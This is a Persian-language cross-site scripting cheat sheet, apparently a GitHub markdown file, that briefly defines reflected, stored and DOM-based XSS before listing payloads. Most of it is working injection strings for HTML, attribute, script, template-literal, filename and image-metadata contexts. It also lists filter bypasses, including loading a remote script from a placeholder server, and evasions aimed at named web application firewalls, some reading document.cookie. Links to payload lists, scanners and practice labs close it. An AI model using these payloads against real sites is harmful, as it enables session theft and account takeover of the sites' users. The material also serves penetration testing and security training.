

## Reflected XSS
###### دریافت می‌کند و داده‌ها را بدون نکات امنیتی پاسخ http این اسیب‌پذیری داده‌ها را در یک ریکوئست می‌دهد. مهاجم می‌تواند بجای پارامتر‌های یک سایت اسکریپت‌ مخرب خود را قرار دهد و اگر کاربران طراحی شده مهاجم کلیک کنند اسکریپت در مرورگر کاربر اجرا می‌شود  url به 


## Stored XSS 
###### حملات stored xss اسکریپت مخرب تزریق شده که در سرورهای هدف ذخیره می‌شود  
 

## DOM-Based XSS
###### این نوع حمله ( معروف به نوع ۰ ) که دارای پیلود‌هایی است که به جای کد html در DOMیافت می‌شود

 
 



## پیلودهای پایه
```
<script>alert(1)</script> 
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```
--------------------------------------------------------
' یا " را به پیلود اضافه کنید تا محموله را از مقدار یک تگ html جدا کند
```
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

برای مثال سورس کد

```
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```


بعد از اضافه کردن پیلود

```
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

--------------------------------------------------------

 برای حذف کردن کامنت در html می‌توانید به این صورت پیش بروید
```
--><script>alert(1)</script>
```

برای مثال سورس کد
```
<!-- REFLECTED_HERE --> 
```
بعد از اضافه کردن پیلود
```
<!-- --><script>alert(1)</script> –>
```

--------------------------------------------------------
    
ورودی که از داخل تگ‌ها وارد می‌شود و می‌تواند از هر تگی استفاده کند
```
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

برای مثال سورس کد
```
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```
بعد از اضافه کردن پیلود
```
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```
--------------------------------------------------------
 
زمانی استفاده می‌شود که ورودی داخل مقدار مشخصه یک تگ در html فیلتر باشد 
```
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

برای مثال سورس کد
```
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

بعد از اضافه کردن پیلود
```
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```
--------------------------------------------------------

از </script> در ورودی تگ‌های <script> استفاده کنید
```
</script><script>alert(1)</script>
```

برای مثال سورس کد
```
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

بعد از اضافه کردن پیلود
```
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```
--------------------------------------------------------

زمانی که ورودی در تگ اسکریپت، داخل یک مقدار محدود شده رشته قرار می‌گیرد، استفاده می‌شود
'-alert(1)-'
'/alert(1)//

برای مثال سورس کد
<script>
    var sitekey = 'REFLECTED_HERE';
</script>

بعد از اضافه کردن پیلود
<script>
    var sitekey = ''-alert(1)-'';
</script>
--------------------------------------------------------

مانند مورد بالا اما با تفاوت اینکه در داخل یک رشته محدود شده است
\'alert(1)//
برای مثال سورس کد
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
را وارد کنیم به این صورت خواهد بود "-alert(1)-" اگر 
<script>
    var sitekey = '\'-alert(1)-\'';
</script>

بعد از اضافه کردن پیلود
<script>
    var sitekey = '\\'alert(1)//';
</script>
--------------------------------------------------------

زمانی که انعکاس چندگانه در همان خط کد جاوااسکریپت وجود دارد استفاده می‌شود
/alert(1)//\
/alert(1)}//\

برای مثال سورس کد
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>

بعد از اضافه کردن پیلود
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
--------------------------------------------------------

زمانی که ورودی در داخل یک رشته محدود شده و داخل یک بلوک منطقی مانند تابع یا شرطی است, استفاده می شود
'}alert(1);{'
\'}alert(1);{// 

برای مثال سورس کد
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>

بعد از اضافه کردن پیلود
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
پیلود شماره 2 زمانی استفاده می شود که با بک‌اسلش باشد
--------------------------------------------------------

زمانی که ورودی در رشته‌های محدود شده بکتیک قرار می‌گیرد استفاده می‌شود
${alert(1)}
برای مثال سورس کد
<script>
    var dapos = `REFLECTED_HERE`;
</script>

بعد از اضافه کردن پیلود
<script>
    var dapos = `${alert(1)}`;
</script>
--------------------------------------------------------

زمانی استفاده می‌شود که انعکاس‌های متعددی در صفحه وجود داشته باشد. (انعکاس دوگانه)
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*

بعد از اضافه کردن پیلود
<!DOCTYPE html>
<html>
<body>
'onload=alert(1)><svg/1='
...
'onload=alert(1)><svg/1='
</body>
</html>
--------------------------------------------------------

زمانی استفاده می‌شود که انعکاس‌های متعددی در صفحه وجود داشته باشد. (انعکاس سه‌گانه)
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

بعد از اضافه کردن پیلود
<!DOCTYPE html>
<html>
<body>
*/alert(1)">'onload="/*<svg/1='
...
*/alert(1)">'onload="/*<svg/1='
...
*/alert(1)">'onload="/*<svg/1='
</body>
</html>
--------------------------------------------------------

در نام فایل (بارگذاری فایل) زمانی که نام فایل آپلود شده در جایی در صفحه هدف منعکس شود xss
"><svg onload=alert(1)>.jpeg
--------------------------------------------------------

استفاده می‌شود exiftool در ابرداده (آپلود فایل) با کمک ابزار xss
$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
-------------------------------------------------------- 

(آپلود فایل) SVGبا فایل  XSS
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
-------------------------------------------------------

از طریق علامت گذاری xss
[Click Me](javascript:alert('1'))
-------------------------------------------------------

xml در صفحه  xss
<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>

اگر ورودی در کامنت قرار گرفت،  "-->" را  اضافه کنید
قرار دارد  "]]>" را اضافه کنید CDATA اگر ورودی در
--------------------------------------------------------



XSS Bypass

فیلتر شده باشد می‌توانید از تگ‌های دیگر استفاده کرد script اگر کلمه 
<IMG SRC=javascript:alert("xss")>
-------------------------------------------------------- 

اگر " یا ' فیلتر شده است می‌توانید ان را حذف کنید
<IMG SRC=javascript:alert(1)>
--------------------------------------------------------

alert دور زدن
می‌توانید به صورت زیر اسکریپت مخرب در سرور خود اپلود کرده و استفاده کنید
<script src="http://server.com/xss.js"></script>
--------------------------------------------------------

کوچک و بزرگ کردن حروف
<Scipt>alert("xss")</Scipt>
--------------------------------------------------------

تگ‌های بسته نشده
<svg onload="alert(1)"
--------------------------------------------------------

پیلودهای با حروف بزرگ
<SVG ONLOAD=ALERT(1)>
--------------------------------------------------------

انکد کردن پیلودها
(Encoded)
%3Csvg%20onload%3Dalert(1)%3E 

(Double Encoded)
%253Csvg%2520onload%253Dalert%281%29%253E 

(Triple Encoded)
%25253Csvg%252520onload%25253Dalert%25281%2529%25253E
-------------------------------------------------------- 

دور زدن اعتبارسنجی ایمیل PHP 
<svg/onload=alert(1)>"@gmail.com
--------------------------------------------------------

URL دور زدن اعتبارسنجی PHP 
javascript://%250Aalert(1)
--------------------------------------------------------

دور زدن کامنت‌ها
<!--><svg onload=alert(1)-->
--------------------------------------------------------




Bypass WAF
Cloudflare

<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<svg%0Aonauxclick=0;[1].some(confirm)//
<svg/onload={alert`1`}>

<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>

"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

"><onx=[] onmouseover=prompt(1)>

%2sscript%2ualert()%2s/script%2u

"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))

[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)

<svg onload=alert%26%230000000040"1")>

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<svg/onrandom=random onload=confirm(1)>

<video onnull=null onmouseover=confirm(1)>

<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>

<img ignored=() src=x onerror=prompt(1)>

<svg onx=() onload=(confirm)(1)>

<--`<img/src=` onerror=confirm``> --!>

<img src=x onerror="a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](document.domain)">

<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x

'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

'"><img/src/onerror=.1|alert``>

:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
------------------------------------------------------


Cloudfront

">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>
<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>

"><--<img+src= "><svg/onload+alert(document.domain)>> --!>
------------------------------------------------------


Cloudbric

<a69/onclick=[1].findIndex(alert)>pew
------------------------------------------------------


Comodo WAF

<input/oninput='new Function`confir\u006d\`0\``'>
<p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
------------------------------------------------------


ModSecurity

<a href="jav%0Dascript&colon;alert(1)">
------------------------------------------------------


Imperva

<input id='a'value='global'><input id='b'value='E'><input 'id='c'value='val'><input id='d'value='aler'><input id='e'value='t(documen'><input id='f'value='t.domain)'><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>

<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme

<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click

<a69/onclick=write&lpar;&rpar;>pew

<details/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"/open>

<svg onload\r\n=$.globalEval("al"+"ert()");>

<svg/onload=self[`aler`%2b`t`]`1`>

%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%2523x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%2526%2523x29%3B%22%3E

<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>

<img/src=q onerror='new Function`al\ert\`1\``'>

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
------------------------------------------------------


AWS

<script>eval(atob(decodeURIComponent(confirm`1`)))</script>
--------------------------------------------------------


Incapsula WAF

anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz

<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<svg onload\r\n=$.globalEval("al"+"ert()");>
--------------------------------------------------------


Akamai WAF

?"></script><base%20c%3D=href%3Dhttps:\mysite>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
--------------------------------------------------------


WordFence WAF

<a href=javas&#99;ript:alert(1)>
--------------------------------------------------------


Fortiweb WAF

\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
--------------------------------------------------------



به ادرس زیر مراجعه کنید waf برای مشاهده پیلود‌های دور زدن   
https://github.com/0xInfection/Awesome-WAF 

برای مشاهده لیستی از پیلودها برای دور زدن فیلترینگ به ادرس زیر مراجعه کنید
https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec 

برای مشاهده لیست انبوهی از پیلود‌ها به ادرس زیر مراجعه کنید
https://exploit.linuxsec.org/xss-payloads-list/ 


ابزار‌ها

https://github.com/s0md3v/XSStrike 
https://github.com/epsylon/xsser 
https://github.com/hahwul/dalfox 
https://github.com/hahwul/XSpear 
https://github.com/fcavallarin/domdig 
https://github.com/oppsec/Pinkerton


ازمایشگاه 
https://portswigger.net/web-security/all-labs#cross-site-scripting 
 
